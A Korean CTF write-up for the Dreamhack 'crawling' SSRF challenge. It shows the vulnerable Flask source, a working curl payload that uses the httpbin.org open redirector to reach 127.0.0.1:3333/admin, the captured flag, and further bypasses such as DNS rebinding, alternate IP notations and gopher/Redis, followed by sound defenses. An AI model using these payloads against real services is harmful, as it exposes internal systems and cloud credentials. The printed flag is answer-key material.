---
layout: post
title:  "Dreamhack 워게임 crawling 풀이 — 외부 리다이렉트 한 번으로 SSRF의 is_global 가드를 뚫기"
date:   2026-05-15 06:30:00 +0900
categories: security web wargame dreamhack writeup ssrf
---

## 들어가며

Dreamhack 웹해킹 워게임 **crawling** (난이도 Silver 2) 풀이입니다. 흔한 "URL 입력하면 그 페이지를 가져와서 보여주는 사이트" 형태인데, **DNS 이름과 실제 요청 대상이 일치한다는 잘못된 가정** 을 깨는 클래식한 SSRF 우회 패턴이 핵심입니다.

문제 설명:

> 드림이는 웹 크롤링 사이트를 구축했습니다. 크롤링 사이트에서 취약점을 찾고 flag를 획득하세요!

스포일러로 결론:

```bash
curl -G "$SERVER/validation" --data-urlencode \
  "url=http://httpbin.org/redirect-to?url=http://127.0.0.1:3333/admin"
# → ... <td>DH{d881f7e8ef64f32224a4db6d6764466a}</td> ...
```

`requests.get(url)` 의 자동 리다이렉트 한 줄에 모든 SSRF 가드가 무너집니다.

> Note: 본 글은 워게임 학습용 PoC 입니다. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

```python
def lookup(url):
    try:
        return socket.gethostbyname(url)
    except:
        return False

def check_global(ip):
    try:
        return (ipaddress.ip_address(ip)).is_global
    except:
        return False

def check_get(url):
    ip = lookup(urlparse(url).netloc.split(':')[0])    # ① DNS 한 번
    if ip == False or ip =='0.0.0.0':
        return "Not a valid URL."
    res = requests.get(url)                             # ② 실제 HTTP GET
    if check_global(ip) == False:                       # ③ ①의 IP가 글로벌인지
        return "Can you access my admin page~?"
    for i in res.text.split('>'):
        if 'referer' in i:
            ref_host = urlparse(res.headers.get('refer')).netloc.split(':')[0]
            if ref_host == 'localhost': return False
            if ref_host == '127.0.0.1': return False
    res = requests.get(url)                             # ④ 두 번째 HTTP GET
    return res.text

@app.route('/admin')
def admin_page():
    if request.remote_addr != '127.0.0.1':
        return "This is local page!"
    return app.flag                                     # ★ 우리가 도달해야 하는 곳

@app.route('/validation')
def validation():
    url = request.args.get('url', '')
    ip = lookup(urlparse(url).netloc.split(':')[0])
    res = check_get(url)
    return render_template('validation.html', url=url, ip=ip, res=res)
```

목표: **`/admin` 의 `app.flag` 응답을 끄집어내는 것**.

`/admin` 은 `remote_addr == '127.0.0.1'` 일 때만 flag 를 돌려준다. 외부에서 직접 두드리면 "This is local page!" 만 받음. 즉 **서버가 자기 자신에게 GET 을 쏘게** 만들어야 한다. → 전형적인 SSRF 시나리오.

`check_get` 안에서 `requests.get(url)` 이 두 번 호출되는데, 그 결과를 우리가 받을 수 있다면 flag 가 노출된다. 그런데 두 개의 가드가 있다.

### 1-1. 가드 1: `ip == '0.0.0.0'` 차단

`lookup` 이 `'0.0.0.0'` 을 돌려주면 거부. 일부 트릭(예: `http://0`) 의 우회 차단.

### 1-2. 가드 2: `check_global(ip) == False` 일 때 본문 비공개

`ipaddress.ip_address(ip).is_global` 이 False 면 응답을 안 돌려주고 "Can you access my admin page~?" 만 응답. 즉, **URL 의 호스트가 사설망 IP 로 직접 resolve 되면 결과를 못 본다**.

`127.0.0.1`, `10.0.0.1`, `192.168.1.1` 모두 `is_global == False`. 이 가드 때문에 단순 `http://127.0.0.1:3333/admin` URL 입력은 안 통한다.

### 1-3. 결정적 단서

`requests.get(url, allow_redirects=True)` 가 디폴트. 즉 **응답이 3xx + Location 헤더면 requests 가 자동으로 따라간다**. 그 리다이렉트 따라간 결과(=`/admin` 의 flag) 가 `res.text` 에 들어온다.

`check_global` 은 ① 단계의 IP, 즉 **최초 hostname 의 IP** 만 본다. 우리가 글로벌 IP 의 hostname 으로 시작하기만 하면 `is_global` 가드는 통과. 그 후 requests 가 어디로 리다이렉트해 따라가든 가드는 다시 안 본다.

## 2. 페이로드 한 줄

가장 깔끔한 redirect 도구: **`httpbin.org/redirect-to?url=...`**. 이 엔드포인트는 다음과 같이 동작한다.

```
GET https://httpbin.org/redirect-to?url=http://127.0.0.1:3333/admin
  ↓
HTTP/1.1 302 Found
Location: http://127.0.0.1:3333/admin
```

`requests.get` 이 Location 헤더를 따라 `http://127.0.0.1:3333/admin` 으로 두 번째 요청을 보낸다. 이 두 번째 요청은 **서버 자신** 에서 자기 자신으로 가는 셈이라 `request.remote_addr` 가 `127.0.0.1` 로 보인다. 결과적으로 `app.flag` 가 res.text 에 담겨 돌아온다.

```bash
SERVER=http://host3.dreamhack.games:<port>
curl -G "$SERVER/validation" --data-urlencode \
  "url=http://httpbin.org/redirect-to?url=http://127.0.0.1:3333/admin"
```

응답 HTML 의 `<td>...</td>` 안에:

```
DH{d881f7e8ef64f32224a4db6d6764466a}
```

flag 획득. ✓

### 2-1. 왜 이 한 줄로 끝나는가

각 가드 통과를 한 줄씩 검증:

- `lookup('httpbin.org')` → 글로벌 IP (예: 54.x.x.x). ✓
- `ip != False and ip != '0.0.0.0'` ✓
- `requests.get('http://httpbin.org/redirect-to?url=...')` → 자동으로 redirect → `http://127.0.0.1:3333/admin` 으로 GET → res.text = flag
- `check_global(ip)` 는 ①의 httpbin IP 로 판정 → True ✓
- `res.text` 안에 `referer` 라는 word 가 들어있는지 확인. flag 형식이 `DH{...}` 라 'referer' 없음. ✓
- 두 번째 `requests.get(url)` 도 동일하게 리다이렉트 따라감, 같은 flag.

## 3. 취약점 해설 — DNS-vs-Request Mismatch + Open Redirector

이 클래스를 두 줄로 요약하면:

> **(1) URL 의 호스트 IP 를 한 번만 검사한 뒤,
> (2) 같은 URL 로 HTTP 클라이언트가 redirect 를 자동으로 따라가게 두면,
> 검사된 IP 와 실제 요청 대상이 일치한다는 보장이 없다.**

즉 SSRF 가드가 **first-hop 만** 보면 **follow-up hop** 으로 우회된다.

같은 패턴이 실무에서 자주 보이는 경로:

- 이미지 프록시 (썸네일 생성기) — 사용자가 제출한 URL 의 첫 호스트만 검증하고, 클라이언트 라이브러리가 알아서 30x 를 따라가는 경우.
- "Open Graph" 미리보기, "URL preview" 봇 (Slack/Discord/Notion 등) — 같은 구조의 SSRF 사고가 정기적으로 알려진다.
- 사용자가 제공한 webhook URL 호출 — 첫 IP 만 보고 글로벌인지 확인 후 그대로 PUSH 하는 케이스.

또한 **open redirector** 가 어디든 하나만 있어도 (httpbin.org 같이 공개된 것이라도) SSRF 페이로드의 발판이 된다. 이게 open redirector 가 OWASP top 항목인 이유.

### 3-1. 다른 우회 경로(이 문제에선 안 썼지만 알아두면 좋은 것)

1. **DNS 리바인딩**: hostname 을 매우 짧은 TTL 로 두고 첫 resolve 는 글로벌 IP, 두 번째 resolve 는 127.0.0.1. `rbndr.us`, `1u.ms`, `lock.cmpxchg8b.com/rebinder.html` 같은 공개 서비스.
2. **URL 파싱 차이**: `http://expected@127.0.0.1/...` 처럼 `@` 로 userinfo 를 끼워넣어 parser 마다 hostname 을 다르게 보게 하는 트릭. Python `urlparse` 와 `requests` 가 미묘하게 다른 방식으로 해석하는 경우가 있다.
3. **IP 표기 변형**: `127.0.0.1` 을 `0x7f000001`(16진수), `2130706433`(10진수), `0177.0.0.1`(8진수), `127.1`(축약) 등으로 표기. `socket.gethostbyname` 은 이 모두를 127.0.0.1 로 해석하지만, `ipaddress.ip_address` 의 동작이 버전마다 다를 수 있어 가끔 통과.
4. **`gopher://`, `file://`, `dict://` 같은 비-HTTP scheme** — requests 는 안 지원하지만, `urllib`, `curl` 기반 라이브러리는 지원해서 별의별 게 가능.

### 3-2. 위험성

- 내부 admin 페이지 노출 (이번 문제)
- 클라우드 메타데이터(AWS `169.254.169.254`, GCP `metadata.google.internal`) 접근 → IAM 자격증명 탈취 (Capital One 2019 사고가 정확히 이 패턴)
- 내부 서비스 fingerprinting 및 잠재적 RCE 체인
- 내부 Redis 의 `CONFIG SET` 으로 임의 파일 쓰기 (gopher SSRF)

### 3-3. 올바른 방어

1. **HTTP 클라이언트의 자동 리다이렉트를 끄거나, 매 hop 마다 IP 재검증.**

   ```python
   import requests
   r = requests.get(url, allow_redirects=False, timeout=5)
   while r.is_redirect:
       next_url = r.headers['Location']
       next_ip = socket.gethostbyname(urlparse(next_url).netloc.split(':')[0])
       if not is_safe(next_ip):     # global + not metadata + not blacklist
           raise SSRFBlocked()
       r = requests.get(next_url, allow_redirects=False, timeout=5)
   ```

   매 hop 의 IP 를 검증하지 않으면 어떤 가드도 의미가 없다.

2. **DNS resolve 와 connect 를 동일 IP 에 고정.** Python 에서는 `requests` 의 connection adapter 를 커스텀해 미리 resolve 한 IP 로만 연결.

3. **outbound 트래픽을 egress proxy 로 강제.** 그 proxy 가 내부망/메타데이터/링크로컬을 strict 차단. 앱이 멋대로 outbound 못 함.

4. **`ipaddress` 의 `is_private` + `is_loopback` + `is_link_local` + `is_multicast` + `is_reserved` 를 모두 차단**, 그리고 IPv6 도 동시에 검증. `is_global` 만 보면 IPv6 link-local, mapped-IPv4 등에서 새는 경우가 있다.

5. **클라우드 메타데이터 차단**: `169.254.169.254`, `fd00:ec2::254` 등을 별도 블랙리스트.

## 4. 정리 — 입문자가 가져갈 교훈

- SSRF 가드를 짤 때는 **"URL 첫 호스트만 검증" 으로 끝나지 마라**. 클라이언트가 redirect/CNAME/DNS 변경을 따라가면 검증이 무용지물이 된다.
- 자동 리다이렉트는 HTTP 클라이언트 기본값이다. `requests`, `urllib`, `aiohttp`, `axios`, `fetch`, `curl -L` 등 거의 모든 도구가 디폴트 follow. **SSRF 컨텍스트에서는 항상 follow 를 끄거나 검증 반복**.
- `httpbin.org/redirect-to`, `bit.ly`, 사용자가 제어 가능한 webhook 등 **open redirector** 는 모든 SSRF 페이로드의 부스터.
- IP 차단은 **블랙리스트가 아니라 화이트리스트** 로. 외부로 나가야 하는 도메인이 정해져 있다면 그것만 허용.
- 내부 서비스(특히 admin 같이 IP 기반 권한 체크 하는 페이지) 는 **IP 한 가지 검증으로 신뢰하지 말 것**. 추가 인증 토큰을 같이 요구하자.

같은 카테고리의 다음 단계로 **SSRF Advanced**, **DNS rebinding**, **gopher SSRF → Redis RCE**, **cloud metadata exfil** 같은 문제를 풀면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 처음에 직접 `http://127.0.0.1:3333/admin` 시도

가장 단순한 페이로드부터 시도. 예상대로 `check_global(127.0.0.1) == False` 라 `"Can you access my admin page~?"` 만 응답. 이게 첫 번째 가드의 의미를 확인하는 절차였다.

**회고**: SSRF 문제는 항상 **"내가 노린 내부 호스트를 그냥 URL 로 줘봤을 때 차단되는 정확한 메시지"** 부터 확인하는 게 좋다. 그 메시지를 통해 어떤 가드가 어디서 작동하는지 알 수 있다.

### 실패 2. `is_global` 가드를 잘못 이해할 뻔

처음에 `is_global` 가 단순히 `not is_private` 인 줄 알았는데, Python `ipaddress` 의 `is_global` 은 더 엄격한 정의(RFC 6890 의 special-purpose registry 까지 보는 것) 라서, `0.0.0.0`, `169.254.x.x`, `224.0.0.0/4` 등 다양한 special use IP 가 false 다. 이번 문제는 단순히 127.x 만 잡으면 되므로 영향 없음. 그래도 디테일은 알고 있어야 한다.

**회고**: `ipaddress` 모듈의 IP 속성 (`is_global`, `is_private`, `is_reserved`, `is_link_local`, `is_loopback`, `is_multicast`) 은 모두 미세하게 다르다. 방어 코드에서 한 가지 속성만 보고 끝내면 사각지대가 생긴다.

### 실패 3. DNS 리바인딩으로 먼저 갈 뻔

이 문제를 풀기 시작할 때 첫 본능은 DNS 리바인딩이었다. `rbndr.us` URL 을 준비하다가 코드를 다시 보고 **`requests` 가 디폴트로 redirect 따라간다** 는 점을 인지. open redirector 한 줄이면 훨씬 깔끔하다.

**회고**: SSRF 우회는 항상 **간단한 순서로** 시도. 우선 직접 → URL parse 트릭 → open redirector → DNS rebinding → URL scheme variation → IP format variation. 복잡한 트릭일수록 환경 의존성이 크다.

### 실패 4. `referer` 필터를 잠시 두려워함

처음에 `for i in res.text.split('>')` + `if 'referer' in i` 가 무엇을 막는지 헷갈렸다. 결국 `/admin` 응답에 'referer' 라는 글자가 없으면 무력화. flag 응답 자체가 `DH{...}` 라 통과. 단, 만약 flag 안에 'referer' 가 들어있었다면 함정에 빠질 수도 있었다 (이번엔 운 좋게 그런 일 없음).

**회고**: 다른 사람의 코드를 분석할 때 **이상한 조건문** 은 빠뜨리지 말고 정확히 무엇을 막는지 확인. 이 문제의 'referer' 필터는 실제로 거의 작동하지 않는 dead code 에 가까웠지만, 패턴은 메모해 둘 가치.

### 실패 5. `request.remote_addr` 가 어떻게 127.0.0.1 이 되는지 잠깐 혼동

서버가 자기 자신에게 HTTP 요청을 보내면 클라이언트 ip 가 127.0.0.1 이 된다는 것 — 자명하지만 처음 SSRF 를 만나면 헷갈리는 부분. 같은 머신/컨테이너 안에서 `requests.get('http://127.0.0.1:port/admin')` 호출은 그 컨테이너의 네트워크 스택에서 loopback 인터페이스 통해 자기 자신에게 갔다 오므로, accept 측에서 보면 remote 주소가 127.0.0.1.

**회고**: SSRF 풀 때는 "**누가 누구에게 요청하는가, 그 시점의 src/dst IP 가 무엇인가**" 를 항상 그림으로 그려보자. 가장 헷갈리지 않는 방법.
